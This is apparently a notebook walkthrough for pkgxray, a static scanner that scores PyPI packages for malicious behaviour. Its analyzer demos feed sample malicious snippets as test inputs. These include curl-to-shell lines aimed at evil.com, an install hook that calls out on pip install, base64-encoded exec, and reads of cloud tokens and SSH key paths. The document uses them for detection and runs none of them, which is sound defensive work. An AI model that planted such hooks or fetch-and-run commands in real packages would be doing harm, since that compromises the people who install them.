# pkgxray — Complete Walkthrough

**pkgxray** is a static analysis tool that inspects PyPI packages for suspicious behaviour **without installing them**. It downloads the package archive, extracts Python source files, runs a suite of AST-based analyzers, and produces a calibrated risk score.

---

## Table of Contents

1. [Installation & Setup](#1-installation--setup)
2. [Quick Start — CLI](#2-quick-start--cli)
3. [Python API — Basic Usage](#3-python-api--basic-usage)
4. [Understanding ScanResult](#4-understanding-scanresult)
5. [Risk Scoring Deep Dive](#5-risk-scoring-deep-dive)
6. [All 10 Analyzers Explained](#6-all-10-analyzers-explained)
7. [Generating Reports](#7-generating-reports)
8. [Advanced Usage](#8-advanced-usage)
9. [Architecture Overview](#9-architecture-overview)
10. [Known Limitations](#10-known-limitations)

---
## 1. Installation & Setup

Install pkgxray from your local clone (editable install, recommended during development):

```bash
pip install -e .
```

Or from PyPI once published:

```bash
pip install pkgxray
```

**Optional dependency** — for scanning `pyproject.toml` files on Python < 3.11:

```bash
pip install tomli
```

Verify the installation:

In [ ]:
import pkgxray
print(f"pkgxray version: {pkgxray.__version__}")

---
## 2. Quick Start — CLI

pkgxray ships with a CLI. Run these from your terminal (not from within a notebook cell):

```bash
# Scan a package (latest version, terminal output)
pkgxray scan requests

# Scan a specific version
pkgxray scan requests --version 2.31.0

# Save a JSON report
pkgxray scan paramiko --format json --output paramiko_report.json

# Save an HTML report
pkgxray scan numpy --format html --output numpy_report.html

# Fail a CI pipeline if the risk score is >= 50
pkgxray scan some-package --fail-above 50

# Enable verbose logging (shows pipeline steps and analyser warnings)
pkgxray scan some-package --verbose

# Scan from a private PyPI registry
pkgxray scan internal-pkg --index-url https://my.registry.com

# Clear the on-disk scan cache
pkgxray clear-cache
```

---
## 3. Python API — Basic Usage

The primary entry point is `pkgxray.scan()`. It downloads and analyzes a package and returns a `ScanResult` object.

In [ ]:
from pkgxray import scan

# Scan the latest version of a package
result = scan("more-itertools")

print(f"Package : {result.package_name} {result.version}")
print(f"Score   : {result.risk_score}/100")
print(f"Level   : {result.risk_level}")
print(f"Files   : {result.files_analyzed} analyzed, {len(result.skipped_files)} skipped")
print(f"Findings: {result.summary}")

In [ ]:
# Scan a specific version
result_pinned = scan("requests", version="2.31.0")

print(f"Package : {result_pinned.package_name} {result_pinned.version}")
print(f"Score   : {result_pinned.risk_score}/100  [{result_pinned.risk_level}]")

In [ ]:
# Scan from a private registry (also works via PKGXRAY_INDEX_URL env var)
# result = scan("internal-package", registry_url="https://my.registry.example.com")

---
## 4. Understanding ScanResult

Every scan returns a `ScanResult` dataclass. Here is what each field means:

In [ ]:
from dataclasses import fields
from pkgxray.analyzers.base import ScanResult

print("ScanResult fields:")
for f in fields(ScanResult):
    print(f"  {f.name:25s} : {f.type}")

In [ ]:
# Inspect individual findings
result = scan("paramiko")

print(f"paramiko {result.version} → {result.risk_score}/100 [{result.risk_level}]\n")

# Show all findings, sorted by severity
from pkgxray.analyzers.base import Severity

sev_order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]
sorted_findings = sorted(result.findings, key=lambda f: sev_order.index(f.severity))

for finding in sorted_findings[:10]:   # show first 10
    print(f"[{finding.severity.value.upper():8s}] {finding.analyzer_name:16s} "
          f"{finding.filename.split('/')[-1]:30s} L{finding.line_number}")
    print(f"           {finding.description[:80]}")
    print()

In [ ]:
# Check skipped files (syntax errors, parse errors, missing tomllib)
if result.skipped_files:
    print(f"{len(result.skipped_files)} file(s) could not be analyzed:")
    for sf in result.skipped_files:
        print(f"  {sf['filename']}  →  reason: {sf['reason']}")
else:
    print("No files were skipped.")

# Check binary files (compiled extensions — not analyzed)
print(f"\n{result.binary_files_found} compiled extension(s) found (not analyzed).")

---
## 5. Risk Scoring Deep Dive

pkgxray uses a **two-level capping** system to produce calibrated scores:

### Severity weights

| Severity | Weight |
|----------|--------|
| LOW      | 1      |
| MEDIUM   | 3      |
| HIGH     | 7      |
| CRITICAL | 15     |

### Per-analyser caps

No single analyser can contribute more than its cap to the final score, regardless of how many findings it produces. This prevents legitimate packages (e.g. `requests` making many HTTP calls) from scoring too high.

### Combo bonuses

When multiple high-risk categories appear **together** with sufficient severity, a bonus is added. Example: reading credentials from env vars **AND** making a network call at module level is more dangerous than either alone.

### Risk levels

| Score | Level    |
|-------|----------|
| 0–15  | LOW      |
| 16–35 | MODERATE |
| 36–60 | HIGH     |
| 61–100| CRITICAL |

In [ ]:
# Inspect the scoring constants directly
from pkgxray.scorer import SEVERITY_WEIGHTS, ANALYZER_CAPS, DANGEROUS_COMBOS

print("=== Severity Weights ===")
for sev, w in SEVERITY_WEIGHTS.items():
    print(f"  {sev.value:10s} → {w}")

print("\n=== Per-Analyser Caps ===")
for name, cap in sorted(ANALYZER_CAPS.items(), key=lambda x: -x[1]):
    print(f"  {name:20s} → cap {cap}")

print("\n=== Combo Bonuses ===")
for combo, bonus in DANGEROUS_COMBOS.items():
    analyzers = " + ".join(sorted(combo))
    print(f"  {analyzers:45s} → +{bonus}")

In [ ]:
# Compare baseline packages
baseline_packages = ["more-itertools", "click", "requests", "paramiko"]

print(f"{'Package':<20} {'Version':<12} {'Score':>6}  {'Level'}")
print("-" * 55)

for pkg in baseline_packages:
    r = scan(pkg)
    print(f"{r.package_name:<20} {r.version:<12} {r.risk_score:>6}  {r.risk_level}")

---
## 6. All 10 Analyzers Explained

pkgxray runs 10 analyzers on each file. Each analyzer inherits `BaseAnalyzer`, receives the source code as a string (plus a pre-built AST for Python files), and returns a list of `Finding` objects.

In [ ]:
from pkgxray.analyzers import get_all_analyzers

print(f"{'Analyzer name':<22} {'Description'}")
print("-" * 80)
for az in get_all_analyzers():
    print(f"{az.name:<22} {az.description}")

### Running analyzers manually

You can run any analyzer directly on a source string to understand what it detects:

In [ ]:
import ast
from pkgxray.analyzers.base import build_parent_map, collect_import_aliases
from pkgxray.analyzers.code_exec import CodeExecAnalyzer
from pkgxray.analyzers.obfuscation import ObfuscationAnalyzer
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.network import NetworkAnalyzer
from pkgxray.analyzers.env_access import EnvAccessAnalyzer

def analyze_snippet(source: str, analyzers: list, filename: str = "example.py"):
    """Helper: run a list of analyzers on a source snippet and print findings."""
    tree = ast.parse(source)
    parent_map = build_parent_map(tree)
    aliases = collect_import_aliases(tree)
    
    all_findings = []
    for az in analyzers:
        findings = az.analyze(source, filename, tree=tree, parent_map=parent_map, aliases=aliases)
        all_findings.extend(findings)
    
    if not all_findings:
        print("No findings.")
    for f in all_findings:
        print(f"[{f.severity.value.upper():8s}] {f.analyzer_name}: {f.description}")
        print(f"           Line {f.line_number}: {f.code_snippet}")
        print()

#### 6.1 `code_exec` — Dynamic Code Execution

Detects `eval()`, `exec()`, `compile()`, `ctypes.CDLL()`, and indirect builtins access (`__builtins__["exec"]`).

Calls at **module level** (runs at import time) are escalated to **CRITICAL**.

In [ ]:
source_code_exec = """
import base64

# Module-level exec — CRITICAL (runs at import time)
exec("print('hi')")

def safe_function():
    # Inside a function — HIGH (not auto-executed)
    result = eval("1 + 1")
    return result

# Indirect access via __builtins__
__builtins__["exec"]("payload")
"""

analyze_snippet(source_code_exec, [CodeExecAnalyzer()])

#### 6.2 `obfuscation` — Code Obfuscation

Detects the classic `exec(base64.b64decode(...))` pattern (CRITICAL), two-step variants (`payload = b64decode(...); exec(payload)`), `codecs.decode()` with rot13, `bytes.fromhex()`, and long hex-escaped strings.

In [ ]:
source_obfuscation = """
import base64

# Classic malware pattern — CRITICAL
exec(base64.b64decode("cHJpbnQoJ2hpJyk="))

# Two-step pattern — also CRITICAL
payload = base64.b64decode("cHJpbnQoJ2hpJyk=")
exec(payload)

# Note: base64.b64decode() alone is NOT flagged (legitimate uses)
data = base64.b64decode("aGVsbG8=")
"""

analyze_snippet(source_obfuscation, [ObfuscationAnalyzer()])

#### 6.3 `subprocess` — OS Command Execution

Detects `subprocess.run/call/Popen/check_output`, `os.system/popen/execvp`, `pty.spawn()`, `asyncio.create_subprocess_shell/exec`. Supports aliased module names.

In [ ]:
source_subprocess = """
import subprocess
import os
import asyncio

def build():
    subprocess.run(["make", "build"])   # HIGH (inside function)
    subprocess.Popen(["bash"])          # CRITICAL (Popen always)
    os.system("rm -rf /tmp/build")     # CRITICAL

# Module-level subprocess call — escalated to CRITICAL
subprocess.run(["curl", "http://evil.com"])
"""

analyze_snippet(source_subprocess, [SubprocessAnalyzer()])

#### 6.4 `network` — Network Calls

Detects `urlopen`, `create_connection` (always), `connect()` (unless receiver looks like a DB), and HTTP methods (`get/post/put/delete/patch/head`) when the receiver is a known HTTP client object. Also tracks HTTP client *instances* (`c = httpx.AsyncClient(); c.get(...)`).

In [ ]:
source_network = """
import requests
import httpx

def fetch_data(url):
    r = requests.get(url)         # HIGH — known HTTP receiver
    r2 = requests.post(url)       # HIGH
    return r.json()

class ApiClient:
    def __init__(self):
        self.session = requests.Session()

    def call(self, url):
        return self.session.get(url)  # HIGH — 'session' is a known receiver

# dict.get() is NOT flagged (receiver 'config' not in HTTP receiver set)
config = {"key": "value"}
value = config.get("key")
"""

analyze_snippet(source_network, [NetworkAnalyzer()])

#### 6.5 `env_access` — Environment Variable Access

Detects `os.environ[key]`, `os.getenv(key)`, `os.environ.get(key)`. Classifies by key sensitivity. Resolves aliased `os` module imports.

In [ ]:
source_env = """
import os as operating_system

# Sensitive key — HIGH inside a function
def get_credentials():
    key = operating_system.getenv("AWS_SECRET_ACCESS_KEY")
    token = operating_system.environ.get("GITHUB_TOKEN")
    return key, token

# Module-level sensitive access — escalated to CRITICAL
secret = operating_system.environ["OPENAI_API_KEY"]

# Non-sensitive key — LOW
home = os.getenv("HOME")
"""

analyze_snippet(source_env, [EnvAccessAnalyzer()])

#### 6.6 `filesystem` — Filesystem Access

Detects destructive calls (`os.remove`, `Path.unlink`, `shutil.rmtree`) with **receiver filtering** to avoid flagging `list.remove()`. Also flags references to sensitive paths like `~/.ssh/`, `~/.aws/`, `/etc/passwd`.

In [ ]:
from pkgxray.analyzers.filesystem import FilesystemAnalyzer

source_fs = """
import os
import shutil
from pathlib import Path

def cleanup():
    os.remove("/tmp/build.log")          # HIGH — os receiver
    Path("/tmp/output").unlink()         # HIGH — Path receiver
    shutil.rmtree("/tmp/build")          # HIGH — rmtree always flagged

# Sensitive path reference — CRITICAL
ssh_key_path = "~/.ssh/id_rsa"
aws_creds = "~/.aws/credentials"

# False-positive guard: list.remove() is NOT flagged
my_list = [1, 2, 3]
my_list.remove(2)   # safe — receiver is 'my_list', not in FS receivers
"""

analyze_snippet(source_fs, [FilesystemAnalyzer()])

#### 6.7 `dynamic_imports` — Dynamic Module Imports

Detects `__import__()`, `importlib.import_module()`, and `importlib.util.spec_from_file_location()`. Static string arguments get MEDIUM severity; dynamic arguments get HIGH; module-level calls get CRITICAL.

In [ ]:
from pkgxray.analyzers.dynamic_imports import DynamicImportAnalyzer

source_dynimport = """
import importlib

def load_plugin(name):
    # Dynamic arg — HIGH
    mod = importlib.import_module(name)
    return mod

def static_load():
    # Static arg — MEDIUM (equivalent to: import json)
    return __import__("json")

# Module-level dynamic import — CRITICAL (runs at import time)
importlib.import_module("suspicious_module")
"""

analyze_snippet(source_dynimport, [DynamicImportAnalyzer()])

#### 6.8 `setup_scripts` — Installation Hooks

Runs **only on `setup.py`**. Detects classes that override setuptools command hooks (`install`, `develop`, etc.) with `run` or `__init__` methods, dangerous imports, and dangerous direct calls.

In [ ]:
from pkgxray.analyzers.setup_scripts import SetupScriptAnalyzer

source_setup = """
import subprocess
import socket
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        # This runs automatically when the user does: pip install <package>
        install.run(self)
        subprocess.run(["curl", "-s", "http://evil.com/collect"])

setup(
    name="malicious-example",
    cmdclass={"install": PostInstall},
)
"""

analyze_snippet(source_setup, [SetupScriptAnalyzer()], filename="setup.py")

#### 6.9 `config_files` — Package Configuration Files

Runs on `pyproject.toml` and `setup.cfg`. Detects suspicious build dependencies, shell commands in entrypoints, and post-install hooks defined under `[tool.*].hooks`.

In [ ]:
from pkgxray.analyzers.config_files import ConfigFileAnalyzer

suspicious_pyproject = """
[build-system]
requires = ["setuptools", "requests", "httpx"]
build-backend = "setuptools.build_meta"

[project]
name = "suspicious-package"
version = "1.0.0"

[project.scripts]
my-tool = "bash -c 'curl http://evil.com | sh'"
"""

az = ConfigFileAnalyzer()
findings = az.analyze(suspicious_pyproject, "pyproject.toml")
for f in findings:
    print(f"[{f.severity.value.upper():8s}] {f.description}")

In [ ]:
# A legitimate pyproject.toml should produce no findings
clean_pyproject = """
[build-system]
requires = ["setuptools>=61", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "my-library"
version = "1.2.3"

[project.scripts]
my-cli = "my_library.cli:main"
"""

findings = az.analyze(clean_pyproject, "pyproject.toml")
print(f"Clean pyproject.toml findings: {len(findings)} (expected 0)")

#### 6.10 `process_spawn` — Dangerous Callable as Thread/Process Target

Detects when dangerous OS or subprocess functions are passed as the `target=` argument to `Process`, `Thread`, or executor `submit`/`map`. This pattern evades direct call detection.

In [ ]:
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer

source_spawn = """
import os
import subprocess
from threading import Thread
from multiprocessing import Process
from concurrent.futures import ThreadPoolExecutor

def run_in_background():
    # These are HIGH inside a function
    t = Thread(target=os.system, args=("curl http://evil.com | bash",))
    t.start()

    p = Process(target=subprocess.run, args=(["evil-binary"],))
    p.start()

    with ThreadPoolExecutor() as ex:
        ex.submit(os.execvp, "sh", ["sh", "-c", "evil_command"])
"""

analyze_snippet(source_spawn, [ProcessSpawnAnalyzer()])

---
## 7. Generating Reports

pkgxray supports three output formats: **terminal** (rich), **JSON**, and **HTML**.

In [ ]:
from pkgxray.reporter import generate_report, generate_json_report, generate_html_report
import json

result = scan("click")

# JSON report
json_str = generate_json_report(result)
data = json.loads(json_str)

print(f"JSON keys: {list(data.keys())}")
print(f"\nSummary: {data['summary']}")
print(f"Risk   : {data['risk_score']}/100 [{data['risk_level']}]")

In [ ]:
# Save reports to disk
generate_report(result, output_format="json", output_path="/tmp/click_report.json")
generate_report(result, output_format="html", output_path="/tmp/click_report.html")

print("Reports saved to /tmp/click_report.json and /tmp/click_report.html")

In [ ]:
# Terminal report (rich output — best viewed in a real terminal)
from pkgxray.reporter import print_terminal_report
print_terminal_report(result)

---
## 8. Advanced Usage

### 8.1 Session cache and disk cache

pkgxray has two cache layers:
- **Session cache** (in-memory): caches pinned-version scans within the same Python process.
- **Disk cache** (LRU, persistent): caches results keyed by the archive's SHA-256, survives across sessions.

In [ ]:
import time
from pkgxray import scan, clear_cache

# First scan — hits PyPI
t0 = time.time()
r1 = scan("more-itertools", version="10.3.0")
t1 = time.time()

# Second scan — hits session or disk cache
r2 = scan("more-itertools", version="10.3.0")
t2 = time.time()

print(f"First scan:  {t1-t0:.2f}s")
print(f"Second scan: {t2-t1:.4f}s  (cached)")

# Clear the session cache
clear_cache()
print("Session cache cleared.")

In [ ]:
# Inspect disk cache settings
from pkgxray import MAX_CACHE_ENTRIES, EVICT_COUNT
from pkgxray._disk_cache import CACHE_DIR

print(f"Disk cache directory : {CACHE_DIR}")
print(f"Max cache entries    : {MAX_CACHE_ENTRIES}")
print(f"Evict count (LRU)    : {EVICT_COUNT}")

### 8.2 CI/CD integration — fail-above threshold

Use `--fail-above` in the CLI or check `risk_score` in the API to gate a pipeline:

In [ ]:
def check_package(package_name: str, threshold: int = 40) -> bool:
    """Returns True if the package is safe (score < threshold)."""
    result = scan(package_name)
    safe = result.risk_score < threshold
    status = "OK" if safe else "BLOCKED"
    print(f"[{status}] {package_name} scored {result.risk_score}/100 "
          f"[{result.risk_level}] (threshold: {threshold})")
    return safe

packages_to_check = ["more-itertools", "requests", "paramiko"]
all_safe = all(check_package(pkg, threshold=40) for pkg in packages_to_check)
print(f"\nAll packages safe: {all_safe}")

### 8.3 Filtering and aggregating findings programmatically

In [ ]:
from collections import Counter
from pkgxray.analyzers.base import Severity

result = scan("paramiko")

# Group findings by analyzer
by_analyzer = Counter(f.analyzer_name for f in result.findings)
print("Findings by analyzer:")
for name, count in by_analyzer.most_common():
    print(f"  {name:<20} {count}")

print()

# Filter only CRITICAL findings
critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
print(f"Critical findings ({len(critical)}):")
for f in critical:
    print(f"  {f.filename.split('/')[-1]}:{f.line_number}  {f.description[:70]}")

### 8.4 Verbose logging

Enable `logging.DEBUG` to see pipeline steps and per-analyzer warnings:

In [ ]:
import logging

logging.basicConfig(level=logging.DEBUG, format="%(levelname)s %(name)s: %(message)s")

# Run a scan — you'll see debug output
r = scan("more-itertools")

# Disable verbose logging afterwards
logging.disable(logging.CRITICAL)

---
## 9. Architecture Overview

```
User / CLI
    │
    ▼
scanner.scan(package_name, version)       ← single public entry-point
    │
    ├─► downloader.get_package_info()      ← PyPI JSON API (urllib, no requests)
    │       └─► downloader.download_file() ← verify SHA-256 digest
    │
    ├─► extractor.extract_python_files()   ← .tar.gz / .whl / .zip
    │       └─► yields ExtractedFile(filename, content, is_setup, is_config)
    │
    ├─► [per file] ast.parse() once        ← shared tree + parent_map + aliases
    │
    ├─► analyzers (×10)                    ← each returns List[Finding]
    │       code_exec, obfuscation, subprocess, network, env_access,
    │       filesystem, dynamic_imports, setup_scripts, config_files, process_spawn
    │
    ├─► scorer.calculate_risk_score()      ← per-analyzer caps + combo bonuses → 0-100
    │
    ├─► _disk_cache.write()                ← LRU disk cache keyed by SHA-256
    │
    └─► returns ScanResult
            └─► reporter                   ← terminal (rich) / JSON / HTML
```

### Key design principles

| Principle | Detail |
|---|---|
| **No code execution** | `ast.parse()` only — the analyzed package is never imported or run |
| **No third-party HTTP** | `urllib` (stdlib) only — pkgxray is not subject to its own attack surface |
| **Fail-open** | A crash in one analyzer never aborts the other nine |
| **Shared AST** | The file is parsed once; all analyzers share the same `tree`, `parent_map`, and `aliases` |
| **Module-level escalation** | Code that auto-executes at import time is escalated to CRITICAL |
| **Receiver filtering** | Method call analyzers check the object name to avoid false positives (e.g. `list.remove()` vs `os.remove()`) |

---
## 10. Known Limitations

| Limitation | Impact | Mitigation |
|---|---|---|
| **Aliased imports not fully tracked** | `import subprocess as sp; sp.run(...)` may be missed | Alias resolution covers module-level aliases; intra-function reassignment is out of scope |
| **Binary extensions not analyzed** | `.so`/`.pyd`/`.dll` files cannot be AST-parsed | `binary_files_found` count is reported; future work (ADR-008) |
| **Runtime-conditional malware** | Code gated behind `if os.environ.get("ACTIVATE"):` won't trigger at module level | Pattern still detected by `env_access` and `code_exec` individually |
| **Lambda wrappers in process_spawn** | `Thread(target=lambda: os.system(...))` is not detected | Direct `os.system` call inside the lambda would be caught by `subprocess` analyser |
| **Python < 3.11 needs tomli** | `pyproject.toml` skipped if neither `tomllib` nor `tomli` available | Install `tomli`; file recorded in `skipped_files` with reason `tomllib_unavailable` |
| **Private packages** | Only analyzes packages available from the configured registry | Use `--index-url` or `PKGXRAY_INDEX_URL` for private registries |

In [ ]:
# Summary: scan several packages and show their scores
packages = ["more-itertools", "click", "requests", "attrs", "paramiko"]

print(f"{'Package':<22} {'Version':<12} {'Score':>6}  {'Level':<10} {'Critical':>8} {'High':>5}")
print("-" * 70)

for pkg in packages:
    r = scan(pkg)
    s = r.summary
    print(
        f"{r.package_name:<22} {r.version:<12} {r.risk_score:>6}  "
        f"{r.risk_level:<10} {s['critical']:>8} {s['high']:>5}"
    )